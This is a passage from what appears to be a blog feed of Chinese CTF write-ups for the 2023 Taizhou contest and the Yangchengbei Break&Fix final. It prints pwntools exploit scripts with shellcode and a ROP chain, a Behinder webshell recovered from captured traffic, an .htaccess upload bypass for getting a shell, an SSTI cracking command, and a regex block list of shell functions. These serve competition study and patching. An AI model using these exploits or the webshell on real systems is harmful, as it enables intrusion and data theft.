class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> CDLL<br><br>lib=CDLL(<span class="hljs-string">&quot;./libc.so.6&quot;</span>)<br>p=process(<span class="hljs-string">&quot;SafeNote&quot;</span>)<br>i=<span class="hljs-number">96</span><br><span class="hljs-keyword">while</span> i&gt;<span class="hljs-number">0</span>:<br>    p=remote(<span class="hljs-string">&quot;10.1.101.234&quot;</span>,<span class="hljs-number">9999</span>)<br>    t=lib.time(<span class="hljs-number">0</span>)<br>    p1=process(<span class="hljs-string">&quot;./a.out&quot;</span>)<br>    p1.sendline(<span class="hljs-built_in">str</span>(i))<br>    p.readuntil(<span class="hljs-string">&quot;N =&quot;</span>)<br>    d2=<span class="hljs-built_in">int</span>(p.readline())<br>    p.sendlineafter(<span class="hljs-string">&quot;choice:&quot;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>    p.readuntil(<span class="hljs-string">&quot;password = &quot;</span>)<br>    d=<span class="hljs-built_in">int</span>(p.readline().strip().decode(<span class="hljs-string">&quot;utf-8&quot;</span>))<br>    p1.send(<span class="hljs-built_in">str</span>(d))<br>    p1.readuntil(<span class="hljs-string">&#x27;n:&#x27;</span>)<br>    d1=<span class="hljs-built_in">int</span>(p1.readline().decode(<span class="hljs-string">&quot;utf-8&quot;</span>).strip())<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;n(1): &quot;</span>+<span class="hljs-built_in">str</span>(d2))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;n(2): &quot;</span>+<span class="hljs-built_in">str</span>(d1))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;nu: &quot;</span>+<span class="hljs-built_in">str</span>(i))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;time: &quot;</span>+<span class="hljs-built_in">str</span>(t))<br>    <span class="hljs-keyword">if</span> d2!=d1:<br>        p.close()<br>        p1.close()<br>        i-=<span class="hljs-number">1</span><br>        <span class="hljs-keyword">continue</span><br>    <span class="hljs-keyword">break</span><br>p1.readuntil(<span class="hljs-string">&#x27;data:&#x27;</span>)<br>d=p1.readline()<br><span class="hljs-built_in">print</span>(d)<br>p.interactive()<br></code></pre></td></tr></table></figure><p>rsa解密得到password，然后将password发送给靶机得到flag</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;gmp.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;time.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-type">gmp_randstate_t</span> gmp_state;<br>__mpz_struct p,q,n_,e,p_1,q_1,lambda,d_;<br>__mpz_struct secret,msg;<br><span class="hljs-type">char</span>* data,data1;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>data=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x2000</span>);<br>data1=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x2000</span>);<br>__gmpz_inits(&amp;p,&amp;q,&amp;n_,&amp;e,&amp;p_1,&amp;q_1,&amp;lambda,&amp;d_,&amp;secret,&amp;msg,<span class="hljs-number">0</span>);<br>__gmp_randinit_mt(&amp;gmp_state);<br><span class="hljs-type">long</span> <span class="hljs-type">long</span> <span class="hljs-type">int</span> num=<span class="hljs-number">0</span>;<br><span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%lld&quot;</span>,&amp;num);<br>__gmp_randseed_ui(&amp;gmp_state,time(<span class="hljs-number">0</span>)+num);<br>__gmpz_urandomb(&amp;q,&amp;gmp_state,<span class="hljs-number">256</span>);<br>__gmpz_nextprime(&amp;q,&amp;q);<br>__gmpz_urandomb(&amp;p,&amp;gmp_state,<span class="hljs-number">256</span>);<br>__gmpz_nextprime(&amp;p,&amp;p);<br> __gmpz_mul(&amp;n_, &amp;p, &amp;q);<br>  __gmpz_set_ui(&amp;e, <span class="hljs-number">65537LL</span>);<br>  __gmpz_sub_ui(&amp;p_1, &amp;p, <span class="hljs-number">1LL</span>);<br>  __gmpz_sub_ui(&amp;q_1, &amp;q, <span class="hljs-number">1LL</span>);<br>  __gmpz_lcm(&amp;lambda, &amp;p_1, &amp;q_1);<br>  __gmpz_invert(&amp;d_, &amp;e, &amp;lambda);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;n: %s\n&quot;</span>,__gmpz_get_str(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,&amp;n_));<br>read(<span class="hljs-number">0</span>,data,<span class="hljs-number">0x100</span>);<br>__gmpz_set_str(&amp;secret,data,<span class="hljs-number">10</span>);<br>__gmpz_powm(&amp;msg,&amp;secret,&amp;d_,&amp;n_);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;data: %s\n&quot;</span>,__gmpz_get_str(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,&amp;msg));<br><br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;web&quot;&gt;&lt;a href=&quot;#web&quot; class=&quot;headerlink&quot; title=&quot;web&quot;&gt;&lt;/a&gt;web&lt;/h1&gt;&lt;h2 id=&quot;初赛-easy-php&quot;&gt;&lt;a href=&quot;#初赛-easy-php&quot; class=&quot;headerlink&quot; title=</summary>
      
    
    
    
    <category term="wp" scheme="https://www.lewiserii.top/categories/wp/"/>
    
    
    <category term="wp" scheme="https://www.lewiserii.top/tags/wp/"/>
    
    <category term="浙江" scheme="https://www.lewiserii.top/tags/%E6%B5%99%E6%B1%9F/"/>
    
  </entry>
  
  <entry>
    <title>2023台州市第三届网络安全大赛wp</title>
    <link href="https://www.lewiserii.top/%E7%AB%9E%E8%B5%9B/2023%E5%8F%B0%E5%B7%9E%E5%B8%82%E7%AC%AC%E4%B8%89%E5%B1%8A%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9Bwp.html"/>
    <id>https://www.lewiserii.top/%E7%AB%9E%E8%B5%9B/2023%E5%8F%B0%E5%B7%9E%E5%B8%82%E7%AC%AC%E4%B8%89%E5%B1%8A%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9Bwp.html</id>
    <published>2023-09-27T06:00:00.000Z</published>
    <updated>2023-10-13T16:14:31.726Z</updated>
    
    <content type="html"><![CDATA[<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="briefphp"><a href="#briefphp" class="headerlink" title="briefphp"></a>briefphp</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;!--&lt;a href=<span class="hljs-string">&quot;/?source&quot;</span>&gt;source&lt;/a&gt;--&gt;<br><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;source&#x27;</span>])) <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>)  <span class="hljs-meta">?&gt;</span><br><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;./shell.php&#x27;</span>);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>])) &#123;<br><br>        <span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$content</span>, <span class="hljs-string">&#x27;&lt;!DOCTYPE&#x27;</span>) === False) &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;failed to read&#x27;</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$content</span>;<br>            <span class="hljs-keyword">die</span>();<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;nothing here&#x27;</span>);<br>    &#125;<br><br><span class="hljs-meta">?&gt;</span> nothing here<br></code></pre></td></tr></table></figure><p>只能读取以<code>&lt;!DOCTYPE</code>开头的文件，直接用<code>php_filter_chain_generator</code>构造</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/tz2023-web-1.png"></p><p>读取shell.php</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/tz2023-web-2.png"></p><p>然后文件包含转命令执行</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/tz2023-web-3.png"></p><p>蚁剑连接拿到flag</p><h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="这是神马"><a href="#这是神马" class="headerlink" title="这是神马"></a>这是神马</h2><p>流量分析，导出http对象</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>@<span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-variable">$key</span>=<span class="hljs-string">&quot;144a6b2296333602&quot;</span>;<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;k&#x27;</span>]=<span class="hljs-variable">$key</span>;<br><span class="hljs-title function_ invoke__">session_write_close</span>();<br><span class="hljs-variable">$post</span>=<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;php://input&quot;</span>);<br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">extension_loaded</span>(<span class="hljs-string">&#x27;openssl&#x27;</span>))<br>&#123;<br><span class="hljs-variable">$t</span>=<span class="hljs-string">&quot;base64_&quot;</span>.<span class="hljs-string">&quot;decode&quot;</span>;<br><span class="hljs-variable">$post</span>=<span class="hljs-variable">$t</span>(<span class="hljs-variable">$post</span>.<span class="hljs-string">&quot;&quot;</span>);<br><span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$post</span>);<span class="hljs-variable">$i</span>++) &#123;<br>     <span class="hljs-variable">$post</span>[<span class="hljs-variable">$i</span>] = <span class="hljs-variable">$post</span>[<span class="hljs-variable">$i</span>]^<span class="hljs-variable">$key</span>[<span class="hljs-variable">$i</span>+<span class="hljs-number">1</span>&amp;<span class="hljs-number">15</span>];<br>    &#125;<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br><span class="hljs-variable">$post</span>=<span class="hljs-title function_ invoke__">openssl_decrypt</span>(<span class="hljs-variable">$post</span>, <span class="hljs-string">&quot;AES128&quot;</span>, <span class="hljs-variable">$key</span>);<br>&#125;<br>    <span class="hljs-variable">$arr</span>=<span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&#x27;|&#x27;</span>,<span class="hljs-variable">$post</span>);<br>    <span class="hljs-variable">$func</span>=<span class="hljs-variable">$arr</span>[<span class="hljs-number">0</span>];<br>    <span class="hljs-variable">$params</span>=<span class="hljs-variable">$arr</span>[<span class="hljs-number">1</span>];<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">C</span></span>&#123;<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"><span class="hljs-variable">$p</span></span>) </span>&#123;<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$p</span>.<span class="hljs-string">&quot;&quot;</span>);&#125;&#125;<br>    @<span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">C</span>(),<span class="hljs-variable">$params</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>拿到key后解密冰蝎流量</p><p>其中一条流量中发现命令<code>cd /var/www/html/upload/../;tar -czvf - flag | openssl des3 -salt -k th1sisKey -out ./flag.tar.gz</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/tz2023-c2.png"></p><p>生成<code>openssl des3 -salt -k th1sisKey -in ./flag.tar.gz -d -out out.tar.gz</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/tz2023-c1.png"></p><p>解压得到<br><code>🙃💵🌿🎤🚪🌏🐎🥋🚫😆✅✉🚰🚹🎤💧📂👑🚫ℹ🍴😎ℹ🚨📮🛩🥋🥋🔪☀🌉😡👑😂🌊⌨🚪🚹😎🎈💧🕹💧🏎☃ℹ☃🔪🍌✅😇🍍⌨🌿💧🌊🎅☂⏩🌊🍵📮☀💵⌨☂📮😇☂🐍😆☀🚪🚹🍵💧🌏🚫😆🐘🐅😀🚰🐍🙃💧🗒🗒 </code></p><p>使用<code>th1sisKey</code>密钥解emoji-aes得到flag</p><h2 id="李先生的计算机"><a href="#李先生的计算机" class="headerlink" title="李先生的计算机"></a>李先生的计算机</h2><p><code>2.ad1</code>文件，使用FTK Imager挂载</p><p>根据提示直接找邮件存储位置<code>MailMasterData</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/tz2023-c3.png"></p><p>拿到search.db文件，用db browser查看</p><p>得到转账金额<code>600</code>和附件密码<code>dbt_1126_tta</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/tz2023-c4.png"></p><p>jpg加密软件密码<code>123654</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/tz2023-c6.png"></p><p>附件可以在<code>MailMasterData</code>下或<code>download</code>目录下找到</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/tz2023-c5.png"></p><p>解压后得到<code>BorromeanIslands.jpg</code>，jphs解密后得到银行卡号<code>6222025567723373838</code></p><p><code>DASCTF&#123;600_6222025567723373838&#125;</code></p><h2 id="Black-Mamba"><a href="#Black-Mamba" class="headerlink" title="Black Mamba"></a>Black Mamba</h2><p>iend后有冗余数据，提取出来后异或24</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>)<br>d=f.read()<br>f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;output.zip&quot;</span>,<span class="hljs-string">&#x27;wb&#x27;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> d:<br>    f.write(<span class="hljs-built_in">bytes</span>([i^<span class="hljs-number">24</span>]))<br>f.close()<br></code></pre></td></tr></table></figure><p>异或后是压缩包，hint是<code>说了很多次不要用这么常见的密码了</code></p><p>掏出祖传的字典爆破，得到<code>1qaz@WSX</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/tz2023-c7.png"></p><p>解压后是</p><figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs erlang-repl">EAOJYU?TRX&gt;&#123;XPFABY&#123;<span class="hljs-number">8</span>&#123;<span class="hljs-number">24</span>+<br>有人好像对我键盘做了点手脚，看起来像坏了一样。<br></code></pre></td></tr></table></figure><p>Dvorak解码得到<code>DASCTF&#123;KOBE_BRYANT_8_24&#125;</code></p><h1 id="reverse"><a href="#reverse" class="headerlink" title="reverse"></a>reverse</h1><h2 id="rrrrs"><a href="#rrrrs" class="headerlink" title="rrrrs"></a>rrrrs</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decode</span>(<span class="hljs-params">a</span>):<br>    a^=a&gt;&gt;<span class="hljs-number">18</span><br>    a^=(a&lt;&lt;<span class="hljs-number">15</span>)&amp;<span class="hljs-number">0xefc60000</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>        a^=((a&amp;(<span class="hljs-number">127</span>&lt;&lt;(<span class="hljs-number">7</span>*i)))&lt;&lt;<span class="hljs-number">7</span>)&amp;(<span class="hljs-number">0x9d2c5680</span>)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>):<br>        a^=(a&amp;(<span class="hljs-number">4292870144</span>&gt;&gt;(<span class="hljs-number">11</span>*i)))&gt;&gt;<span class="hljs-number">11</span><br>    <span class="hljs-keyword">return</span> a.to_bytes(<span class="hljs-number">4</span>,<span class="hljs-string">&#x27;big&#x27;</span>)<br><br>c=[<br><span class="hljs-number">0xa7a1e601</span>,<br><span class="hljs-number">0x10a6a5df</span>,<br><span class="hljs-number">0xa3f03b11</span>,<br><span class="hljs-number">0x7e523d64</span>,<br><span class="hljs-number">0xcb99d7a8</span>,<br><span class="hljs-number">0x2ddc2485</span>,<br><span class="hljs-number">0xe3c8b3cd</span>,<br><span class="hljs-number">0x6b82a51e</span>,<br><span class="hljs-number">0x0ea07814</span>,<br><span class="hljs-number">0x6bf2bf07</span>]<br>flag=<span class="hljs-string">b&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> c:<br>    flag+=decode(i)<br><span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure><h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h2 id="babyshell"><a href="#babyshell" class="headerlink" title="babyshell"></a>babyshell</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br>p=remote(<span class="hljs-string">&quot;tcp.cloud.dasctf.com&quot;</span>,<span class="hljs-string">&quot;21844&quot;</span>)<br><span class="hljs-comment">#p=process(&#x27;babyshell&#x27;)</span><br><span class="hljs-comment">#gdb.attach(p,&quot;bp $rebase(0x1366)&quot;)</span><br><span class="hljs-comment">#pause()</span><br>shellcode=shellcraft.openat(-<span class="hljs-number">100</span>,<span class="hljs-string">&quot;flag&quot;</span>)<br>shellcode+=shellcraft.brk()<br>shellcode+=<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">mov rsi,rax</span><br><span class="hljs-string">sub rsi,0x1000</span><br><span class="hljs-string">mov rdi,3</span><br><span class="hljs-string">mov rdx,0x100</span><br><span class="hljs-string">mov rax,0</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string">mov rdi,1</span><br><span class="hljs-string">mov rax,1</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>p.send(asm(shellcode))<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="mercedes"><a href="#mercedes" class="headerlink" title="mercedes"></a>mercedes</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p=remote(<span class="hljs-string">&#x27;tcp.cloud.dasctf.com&#x27;</span>,<span class="hljs-string">&#x27;28629&#x27;</span>)<br>e=ELF(<span class="hljs-string">&quot;mercedes&quot;</span>)<br>context.binary=e<br>system=e.plt[<span class="hljs-string">&#x27;system&#x27;</span>]<br>comm=<span class="hljs-number">0x601090</span><br>rdi=<span class="hljs-number">0x0000000000400983</span><br>ret=<span class="hljs-number">0x00000000004005ae</span><br>p.sendafter(<span class="hljs-string">&#x27;drink&#x27;</span>,<span class="hljs-string">&#x27;tac flag 1&gt;&amp;2&#x27;</span>)<br>p.sendafter(<span class="hljs-string">&#x27;you?&#x27;</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x28</span>+p64(rdi)+p64(comm)+p64(ret)+p64(system))<br><br>p.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;web&quot;&gt;&lt;a href=&quot;#web&quot; class=&quot;headerlink&quot; title=&quot;web&quot;&gt;&lt;/a&gt;web&lt;/h1&gt;&lt;h2 id=&quot;briefphp&quot;&gt;&lt;a href=&quot;#briefphp&quot; class=&quot;headerlink&quot; title=&quot;brief</summary>
      
    
    
    
    <category term="wp" scheme="https://www.lewiserii.top/categories/wp/"/>
    
    
    <category term="wp" scheme="https://www.lewiserii.top/tags/wp/"/>
    
    <category term="台州" scheme="https://www.lewiserii.top/tags/%E5%8F%B0%E5%B7%9E/"/>
    
  </entry>
  
  <entry>
    <title>2023羊城杯决赛web&amp;pwn Break&amp;Fix wp</title>
    <link href="https://www.lewiserii.top/%E7%AB%9E%E8%B5%9B/2023%E7%BE%8A%E5%9F%8E%E6%9D%AF%E5%86%B3%E8%B5%9Bwp.html"/>
    <id>https://www.lewiserii.top/%E7%AB%9E%E8%B5%9B/2023%E7%BE%8A%E5%9F%8E%E6%9D%AF%E5%86%B3%E8%B5%9Bwp.html</id>
    <published>2023-09-09T06:00:00.000Z</published>
    <updated>2023-10-18T14:31:11.767Z</updated>
    
    <content type="html"><![CDATA[<p>Break和Fix阶段都是小组第一</p><p>比赛的时候没写wp，<strong>赛后复现</strong></p><h1 id="web-ezSSTI"><a href="#web-ezSSTI" class="headerlink" title="web-ezSSTI"></a>web-ezSSTI</h1><h2 id="Break"><a href="#Break" class="headerlink" title="Break"></a>Break</h2><p><a href="https://github.com/Marven11/Fenjing">焚靖</a>一把梭<br><code>python -m fenjing crack --url &quot;http://192.168.100.100:10007/&quot; --method GET --inputs name  --environment jinja</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/2023ycb-ezSSTI-1.png"></p><h2 id="Fix"><a href="#Fix" class="headerlink" title="Fix"></a>Fix</h2><p>app.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask,request<br><span class="hljs-keyword">from</span> jinja2 <span class="hljs-keyword">import</span> Template<br><span class="hljs-keyword">import</span> re<br><br>app = Flask(__name__)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    name = request.args.get(<span class="hljs-string">&#x27;name&#x27;</span>,<span class="hljs-string">&#x27;CTFer&lt;!--?name=CTFer&#x27;</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> re.findall(<span class="hljs-string">r&quot;&#x27;|_|\\x|\\u|&#123;&#123;|\+|attr|\.| |class|init|globals|popen|system|env|exec|shell_exec|flag|passthru|proc_popen&quot;</span>,name):<br>        t = Template(<span class="hljs-string">&quot;hello &quot;</span>+name)<br>        <span class="hljs-keyword">return</span> t.render()<br>    <span class="hljs-keyword">else</span>:<br>        t = Template(<span class="hljs-string">&quot;Hacker!!!&quot;</span>)<br>        <span class="hljs-keyword">return</span> t.render()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    app.run(host=<span class="hljs-string">&quot;0.0.0.0&quot;</span>,port=<span class="hljs-number">5000</span>)<br></code></pre></td></tr></table></figure><p>直接在正则中添加<code>&quot;</code>，<code>()</code>，<code>[]</code>，<code>\</code>等符号，注意不要过滤太严格，否则过不了check</p><h1 id="web-easyupload"><a href="#web-easyupload" class="headerlink" title="web-easyupload"></a>web-easyupload</h1><h2 id="Break-1"><a href="#Break-1" class="headerlink" title="Break"></a>Break</h2><p>F12可以看到账号密码，<code>admin/hgrehhterh</code>，跳转到<code>dadaadwdwfegrgewg.php</code>，一个文件上传点</p><p>上传<code>.htaccess</code>后传图片拿shell</p><p><code>AddType application/x-httpd-php .png</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/2023ycb-easyupload-1.png"></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/2023ycb-easyupload-2.png"></p><h2 id="Fix-1"><a href="#Fix-1" class="headerlink" title="Fix"></a>Fix</h2><p>dadaadwdwfegrgewg.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span 